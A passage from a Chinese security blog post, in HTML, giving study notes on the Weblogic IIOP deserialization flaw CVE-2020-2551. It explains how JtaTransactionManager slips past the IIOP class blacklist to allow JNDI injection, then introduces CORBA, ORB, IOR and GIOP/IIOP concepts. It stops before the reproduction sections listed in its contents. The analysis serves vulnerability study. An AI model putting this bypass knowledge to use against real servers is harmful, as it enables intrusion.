@@ -1,0 +1,652 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"l3yx.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Weblogic IIOP协议默认开启，跟T3协议一起监听在7001端口，这次漏洞主要原因是错误的过滤JtaTransactionManager类，JtaTransactionManager父类AbstractPlatformTransactionManager在之前的补丁里面就加入到黑名单列表了，T3协议使用的是resolveClass方法去过滤，resolveClass方法是会读取父类的，所以">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Weblogic IIOP 反序列化漏洞学习笔记(CVE-2020-2551)">
+<meta property="og:url" content="https://l3yx.github.io/2020/04/22/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="l3yx&#39;s blog">
+<meta property="og:description" content="Weblogic IIOP协议默认开启，跟T3协议一起监听在7001端口，这次漏洞主要原因是错误的过滤JtaTransactionManager类，JtaTransactionManager父类AbstractPlatformTransactionManager在之前的补丁里面就加入到黑名单列表了，T3协议使用的是resolveClass方法去过滤，resolveClass方法是会读取父类的，所以">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200423103837351.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421141257107.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421141537149.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421141709648.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421141843980.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420140722312.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420152108993.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420152127502.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420152247957.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422181352532.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420165824498.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420170115466.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420170216981.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420170450094.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420170758175.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420172040851.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420172142185.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421214031788.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421214219158.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421214300874.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421214646760.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421220001151.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421220058194.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421220217536.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421220343294.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421220705540.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421221921678.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422145612316.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422145827253.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422145953983.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422150228254.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422150921395.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422151050518.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422151929872.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422152107646.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422152508033.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422152604876.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422154229127.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422154310751.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422160041827.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422154530489.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422154642371.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422154803899.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422154835199.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422203447874.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422203635043.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422203852815.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422204635800.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422210424446.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422210629980.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422210707879.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422210802102.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422211108285.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422220334597.png">
+<meta property="og:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422220347793.png">
+<meta property="article:published_time" content="2020-04-22T03:19:33.000Z">
+<meta property="article:modified_time" content="2020-08-12T03:30:51.410Z">
+<meta property="article:author" content="淚笑">
+<meta property="article:tag" content="Weblogic">
+<meta property="article:tag" content="IIOP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l3yx.github.io/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200423103837351.png">
+
+
+<link rel="canonical" href="https://l3yx.github.io/2020/04/22/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://l3yx.github.io/2020/04/22/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","path":"2020/04/22/Weblogic-IIOP-反序列化漏洞/","title":"Weblogic IIOP 反序列化漏洞学习笔记(CVE-2020-2551)"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Weblogic IIOP 反序列化漏洞学习笔记(CVE-2020-2551) | l3yx's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">l3yx's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Corba%E6%A6%82%E5%BF%B5"><span class="nav-number">1.1.</span> <span class="nav-text">Corba概念</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CORBA"><span class="nav-number">1.1.1.</span> <span class="nav-text">CORBA</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ORB%EF%BC%88Object-Request-Broker%EF%BC%89"><span class="nav-number">1.1.2.</span> <span class="nav-text">ORB（Object Request Broker）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IOR%EF%BC%88Interoperable-Object-References%EF%BC%89"><span class="nav-number">1.1.3.</span> <span class="nav-text">IOR（Interoperable Object References）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GIOP%EF%BC%88General-Inter-ORB-Protocol%EF%BC%89%E4%B8%8E-IIOP-%EF%BC%88Internet-Inter-ORB-Protocol%EF%BC%89"><span class="nav-number">1.1.4.</span> <span class="nav-text">GIOP（General Inter-ORB Protocol）与 IIOP （Internet Inter-ORB Protocol）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IDL"><span class="nav-number">1.1.5.</span> <span class="nav-text">IDL</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B"><span class="nav-number">1.2.</span> <span class="nav-text">通信流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RMI-IIOP"><span class="nav-number">1.3.</span> <span class="nav-text">RMI-IIOP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#RMI-IIOP%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8"><span class="nav-number">1.3.1.</span> <span class="nav-text">RMI-IIOP远程调用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Weblogic%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">Weblogic环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">3.</span> <span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E6%9C%AC%E5%9C%B0%E6%94%BB%E5%87%BBDocker%EF%BC%88%E6%88%90%E5%8A%9F%EF%BC%89"><span class="nav-number">3.1.</span> <span class="nav-text">Linux虚拟机中本地攻击Docker（成功）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%BF%E4%B8%BB%E6%9C%BA%E6%94%BB%E5%87%BB%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%ADDocker%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="nav-number">3.2.</span> <span class="nav-text">宿主机攻击虚拟机中Docker（失败）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Context%E7%9A%84%E7%94%9F%E6%88%90%E4%BB%A5%E5%8F%8Abind%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="nav-number">4.1.</span> <span class="nav-text">Context的生成以及bind的流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Weblogic%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B"><span class="nav-number">4.2.</span> <span class="nav-text">Weblogic解析流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3POC-NAT%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98"><span class="nav-number">5.</span> <span class="nav-text">解决POC NAT网络问题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90"><span class="nav-number">5.1.</span> <span class="nav-text">抓包分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E6%9C%AC%E5%9C%B0%E6%94%BB%E5%87%BBDocker"><span class="nav-number">5.1.1.</span> <span class="nav-text">Linux虚拟机中本地攻击Docker</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%BF%E4%B8%BB%E6%9C%BA%E6%94%BB%E5%87%BB%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%ADDocker"><span class="nav-number">5.1.2.</span> <span class="nav-text">宿主机攻击虚拟机中Docker</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E5%86%99%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%A4%84%E7%90%86%E9%80%BB%E8%BE%91"><span class="nav-number">5.2.</span> <span class="nav-text">重写客户端处理逻辑</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="淚笑"
+      src="/resources/avatar.jpg">
+  <p class="site-author-name" itemprop="name">淚笑</p>
+  <div class="site-description" itemprop="description">学的越多，懂的越少</div>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/l3yx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;l3yx" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1729888211@qq.com" title="E-Mail → mailto:1729888211@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://l3yx.github.io/2020/04/22/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/resources/avatar.jpg">
+      <meta itemprop="name" content="淚笑">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l3yx's blog">
+      <meta itemprop="description" content="学的越多，懂的越少">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Weblogic IIOP 反序列化漏洞学习笔记(CVE-2020-2551) | l3yx's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Weblogic IIOP 反序列化漏洞学习笔记(CVE-2020-2551)
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-04-22 11:19:33" itemprop="dateCreated datePublished" datetime="2020-04-22T11:19:33+08:00">2020-04-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2020-08-12 11:30:51" itemprop="dateModified" datetime="2020-08-12T11:30:51+08:00">2020-08-12</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>Weblogic IIOP协议默认开启，跟T3协议一起监听在7001端口，这次漏洞主要原因是错误的过滤JtaTransactionManager类，JtaTransactionManager父类AbstractPlatformTransactionManager在之前的补丁里面就加入到黑名单列表了，T3协议使用的是resolveClass方法去过滤，resolveClass方法是会读取父类的，所以T3协议这样过滤没问题。但是IIOP协议这块虽然也是使用的这个黑名单列表，但不是使用resolveClass方法去判断，默认只会判断本类的类名，而JtaTransactionManager类不在黑名单列表里面并且存在jndi注入</p>
+<span id="more"></span>
+
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="Corba概念"><a href="#Corba概念" class="headerlink" title="Corba概念"></a>Corba概念</h3><h4 id="CORBA"><a href="#CORBA" class="headerlink" title="CORBA"></a>CORBA</h4><p>公用对象请求代理体系结构（Common Object Request Broker Architecture），缩写为 CORBA，是对象管理组织（Object Management Group）制定的一种标准分布式对象结构</p>
+<p>简言之，CORBA 允许应用程序和其他的应用程序通讯，而不论他们在什么地方或者由谁来设计</p>
+<p>CORBA使用平台无关的语言IDL（interface definition language）描述连接到远程对象的接口，然后将其映射到制定的语言实现</p>
+<p>CORBA曾经是分布式计算的主流技术，在电信等领域使用广泛。开发和部署成本较高，目前属于已经基本被遗弃的技术，被轻量级的Web服务、RESTful服务等代替了</p>
+<p>一般来说CORBA将其结构分为三部分</p>
+<ul>
+<li>naming service</li>
+<li>client side</li>
+<li>servant side</li>
+</ul>
+<p>这三部分组成了CORBA结构的基础三元素，而通信过程也是在这三方间完成的。我们知道CORBA是一个基于网络的架构，所以以上三者可以被部署在不同的位置。</p>
+<p><code>servant side</code> 可以理解为一个接收 <code>client side</code> 请求的服务端；</p>
+<p><code>naming service</code> 对于 <code>servant side</code> 来说用于服务方注册其提供的服务，对于 <code>client side</code> 来说客户端将从 <code>naming service</code> 来获取服务方的信息</p>
+<p>这个关系可以简单的理解成目录与章节具体内容的关系：目录即为 <code>naming service</code>，<code>servant side</code> 可以理解为具体的内容，内容需要首先在目录里面进行注册，这样当用户想要访问具体内容时只需要首先在目录中查找到具体内容所注册的引用（通常为页数），这样就可以利用这个引用快速的找到章节具体的内容</p>
+<h4 id="ORB（Object-Request-Broker）"><a href="#ORB（Object-Request-Broker）" class="headerlink" title="ORB（Object Request Broker）"></a><strong>ORB</strong>（Object Request Broker）</h4><p>即对象请求代理，客户端可以很简单的通过这个媒介使用服务器对象的方法而不需要关注服务器对象是在同一台机器上还是通过远程网络调用的，ORB截获调用后负责找到一个对象以满足该请求</p>
+<h4 id="IOR（Interoperable-Object-References）"><a href="#IOR（Interoperable-Object-References）" class="headerlink" title="IOR（Interoperable Object References）"></a>IOR（Interoperable Object References）</h4><p>IOR用于表示一个对象引用，我们知道，当我们在客户端一个CORBA对象的时候，接触的并不是真正的对象，而是这个对象的代理（Proxy），Proxy使用这个对象的位置信息与服务器通信。那么这里有一个问题，这些信息到底些什么信息，另外，ORB使用什么样子的形式去传输这些对象的信息。答案是IOR。这里给它加上Interoperable是因为IOR是ORB Interoperability Architecture的一部分</p>
+<h4 id="GIOP（General-Inter-ORB-Protocol）与-IIOP-（Internet-Inter-ORB-Protocol）"><a href="#GIOP（General-Inter-ORB-Protocol）与-IIOP-（Internet-Inter-ORB-Protocol）" class="headerlink" title="GIOP（General Inter-ORB Protocol）与 IIOP （Internet Inter-ORB Protocol）"></a><strong>GIOP</strong>（General Inter-ORB Protocol）与 <strong>IIOP</strong> （Internet Inter-ORB Protocol）</h4><p>GIOP全称（General Inter-ORB Protocol）通用对象请求协议，其功能简单来说就是CORBA用来进行数据传输的协议</p>
+<p>GIOP是一个抽象的协议，针对不同的通信层有不同的具体实现，而针对于TCP&#x2F;IP层，其实现名为IIOP（Internet Inter-ORB Protocol），定义了如何通过TCP&#x2F;IP协议交换GIOP消息，所以通常说CORBA是基于IIOP协议的</p>
